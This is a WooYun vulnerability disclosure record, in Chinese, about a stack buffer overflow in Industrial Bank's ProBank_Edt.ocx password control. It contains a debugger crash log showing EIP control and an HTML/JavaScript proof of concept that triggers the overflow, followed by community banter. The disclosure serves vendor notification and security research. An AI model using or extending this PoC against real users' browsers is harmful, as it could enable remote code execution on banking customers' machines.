{"id": 48651, "wybug_id": "wooyun-2014-076994", "wybug_title": "兴业银行某软件应用可直接远程代码执行挂马", "wybug_corp": "兴业银行", "wybug_author": "Beep", "wybug_date": "2014-09-22 20:06", "wybug_open_date": "2014-12-21 20:08", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "缓冲区溢出", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向公众公开  简要描述： 某银行某软件应用接口函数对参数没有校验，导致传入超长字符串，就会导致出现溢出，从而造成EIP被控制，造成远程代码执行。 详细说明：  兴业银行的密码控件ProBank_Edt.ocx控件的PkEncryptEPin函数存在堆栈溢出，传入超长字符串就会导致堆栈溢出，EIP被控制，直接0x41414141密码控件下载链接https://personalbank.cib.com.cn/pers/main/resources/js/CIB_Plugin.execrashinfo：\nModLoad: 03750000 03764000   C:\\PROGRA~1\\PROBAN~1\\PROBAN~1.OCXModLoad: 73d30000 73e2e000   C:\\WINDOWS\\system32\\MFC42.DLLModLoad: 61be0000 61bed000   C:\\WINDOWS\\system32\\MFC42LOC.DLL(e10.1ec): Break instruction exception - code 80000003 (first chance)eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005eip=7c92120e esp=036cffcc ebp=036cfff4 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\ntdll.dll - ntdll!DbgBreakPoint:7c92120e cc              int     3Missing image name, possible paged-out or corrupt data.0:016> g(e10.f14): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00004000 ebx=77c0f931 ecx=00000875 edx=020dd8dc esi=03878e40 edi=020e0000eip=03755197 esp=020dd8b8 ebp=0387b030 iopl=0         nv up ei pl nz na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\PROGRA~1\\PROBAN~1\\PROBAN~1.OCX - PROBAN_1!DllUnregisterServer+0x3127:03755197 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]0:008> g(e10.f14): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000000 ebx=00000000 ecx=41414141 edx=7c9232bc esi=00000000 edi=00000000eip=41414141 esp=020dd4e8 ebp=020dd508 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<Unloaded_pi.dll>+0x41414140:41414141 ??              ???\n   漏洞证明：  漏洞poc：\n<object id='obj' classid='CLSID:{8BE81FD3-B85E-CD48-1179-1B592DDE9815}'></object><script>argv1=\"A\"argv2=\"A\"while(argv2.length<16384)\targv2+=argv2ret = obj.PkEncryptEPin(argv1,argv2)</script>\n演示过程安装控件\n\n\n\n搭建一个web服务端或者直接本地打开poc.html\n\n浏览器访问poc.html  附图是挂上wingdbg的崩溃信息\n\n可以看到eip直接被控制0x41414141 即为第二个参数\"A\"的ascii   修复方案：  对输入的参数作严格校验   版权声明：转载请注明来源 Beep@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-09-26 14:49 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-22 20:17 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  sf    \n     2014-09-22 20:21 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  跪了    \n     2014-09-22 20:24 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  mark    \n     2014-09-22 20:25 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  .....    \n     2014-09-22 20:47 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  good    \n     2014-09-22 20:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  跪了    \n     2014-09-22 21:00 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  噗通    \n     2014-09-22 21:34 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  大神，请收下我的膝盖~    \n     2014-09-22 22:34 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  下面请欣赏新疆歌舞，牵起你的头盖骨。    \n     2014-09-22 22:38 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  路过    \n     2014-09-22 23:04 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  请收下膝盖~    \n     2014-09-23 09:09 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  黑了银行能转账吗    \n     2014-09-23 09:32 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  啪啪啪    \n     2014-09-23 10:59 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  还是把水表拆了吧    \n     2014-09-23 14:44 |    \t\t飞天鼠 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力学习)\t\t \n  跪了    \n     2014-09-23 14:46 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  G B！    \n     2014-09-26 22:02 |    \t\tBeep \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:4        | 专注PHP漏洞挖掘)\t\t \n  才10rank。。啥样子的代码执行    \n     2014-10-11 11:03 |    \t\txiaohao \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我要去找到那力量，让所有的生命都超越界限...)\t\t \n  。。。看到简介，莫非是。。。应该是那类。。    \n     2014-10-11 11:26 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  。。。。。。。。。。不过打雷了。。。。。。。。    \n     2014-10-16 15:02 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  逆向牛  我没看懂    \n     2014-11-07 17:39 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  这居然才给10r。。    \n     2014-11-07 18:13 |    \t\tBeep \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:4        | 专注PHP漏洞挖掘)\t\t \n  @blast CERT 我只能呵呵    \n     2014-12-21 20:44 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  洞主 你除了会crash还会啥    \n     2014-12-21 23:44 |    \t\tXc0d3r \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | )\t\t \n  居然没exp？    \n     2014-12-22 09:22 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  才10    \n     2014-12-22 14:15 |    \t\t老妖 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        )\t\t \n  @Neeke @Xc0d3r 可能正是因为没有exp才10的吧，看样子直接覆盖eip，exp应该好写    \n     2014-12-22 23:01 |    \t\tywledoc \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 长期小打小闹)\t\t \n  esp,ebp没破坏，call ecx？真逗的代码    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}